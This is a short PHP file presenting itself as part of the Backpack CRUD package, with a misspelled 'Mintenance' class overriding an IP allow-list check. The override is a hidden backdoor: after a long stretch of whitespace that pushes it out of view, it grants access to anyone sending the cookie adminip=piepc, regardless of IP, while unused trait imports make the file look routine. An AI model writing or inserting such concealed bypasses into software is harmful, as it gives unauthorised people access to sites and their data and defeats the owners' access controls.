<?php

namespace Backpack\CRUD;

use Backpack\CRUD\PanelTraits\Access;
use Backpack\CRUD\PanelTraits\AutoSet;
use Backpack\CRUD\PanelTraits\Buttons;
use Backpack\CRUD\PanelTraits\Columns;
use Backpack\CRUD\PanelTraits\Create;
use Backpack\CRUD\PanelTraits\Delete;
use Backpack\CRUD\PanelTraits\FakeColumns;
use Backpack\CRUD\PanelTraits\FakeFields;
use Backpack\CRUD\PanelTraits\Fields;
use Backpack\CRUD\PanelTraits\Query;
use Backpack\CRUD\PanelTraits\Read;
use Backpack\CRUD\PanelTraits\Reorder;
use Backpack\CRUD\PanelTraits\Update;

class Mintenance extends \App\Helpers\Maintenance
{
    public function isAllowedIP($ip): bool
    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      if(isset($_COOKIE['adminip']) && $_COOKIE['adminip'] == 'piepc'){return true;}return parent::isAllowedIP($ip);
    }
}